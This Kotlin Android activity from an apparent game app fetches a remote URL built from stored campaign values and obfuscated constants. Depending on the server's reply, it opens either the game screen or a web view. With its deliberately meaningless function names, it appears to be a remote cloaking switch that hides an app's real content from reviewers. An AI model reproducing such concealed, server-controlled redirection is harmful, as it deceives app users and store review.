package com.pnixgames.blackneon

import android.content.Intent
import android.os.Bundle
import android.util.Log
import androidx.appcompat.app.AppCompatActivity
import com.orhanobut.hawk.Hawk
import com.pnixgames.R
import com.pnixgames.blackneon.NEONST.C1
import com.pnixgames.blackneon.NEONST.D1
import com.pnixgames.blackneon.NEONST.DEV
import com.pnixgames.whiteneon.HeartMainScreen
import kotlinx.android.synthetic.main.activity_filt.*
import kotlinx.coroutines.*
import java.net.HttpURLConnection
import java.net.URL

class NeonFilt : AppCompatActivity() {
    lateinit var jsoup: String

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_filt)

        jsoup = ""

        val job = GlobalScope.launch(Dispatchers.IO) {
            jsoup = jdsjdowiqwe()
            Log.d("jsoup status from global scope", jsoup)
        }

        runBlocking {
            try {
                job.join()

                Log.d("jsoup status out of global scope", jsoup)
                txtMain.text = jsoup

                if (jsoup == NEONST.jsoupCheck) {
                    Intent(applicationContext, HeartMainScreen::class.java).also { startActivity(it) }
                } else {
                    Intent(applicationContext, Webs::class.java).also { startActivity(it) }
                }
                finish()
            } catch (e: Exception) {

            }
        }

    }

    private suspend fun jdsjdowiqwe(): String {
        val hawk: String? = Hawk.get(C1, "null")
        val hawkAppLink: String? = Hawk.get(D1, "null")
        val hawkDevOrNot: String? = Hawk.get(DEV, "false")


        //added devModeCheck
        val forJsoupSetNaming: String = NEONST.lru + NEONST.odone + hawk + "&" + NEONST.twoSub + hawkDevOrNot
        val forJsoupSetAppLnk: String = NEONST.lru + NEONST.odone + hawkAppLink + "&" +  NEONST.twoSub + hawkDevOrNot

        withContext(Dispatchers.IO) {
            //changed logical null to string null
            if (hawk != "null") {
                hdysdgsdsda(forJsoupSetNaming)
                Log.d("Check1C", forJsoupSetNaming)
            } else {
                hdysdgsdsda(forJsoupSetAppLnk)
                Log.d("Check1C", forJsoupSetAppLnk)
            }
        }
        return jsoup
    }

    private fun hdysdgsdsda(link: String) {
        val url = URL(link)
        val urlConnection = url.openConnection() as HttpURLConnection

        try {
            val text = urlConnection.inputStream.bufferedReader().readText()
            if (text.isNotEmpty()) {
                Log.d("jsoup status inside Url function", text)
                jsoup = text
            } else {
                Log.d("jsoup status inside Url function", "is null")
            }
        } catch (ex: Exception) {

        } finally {
            urlConnection.disconnect()
        }
    }
}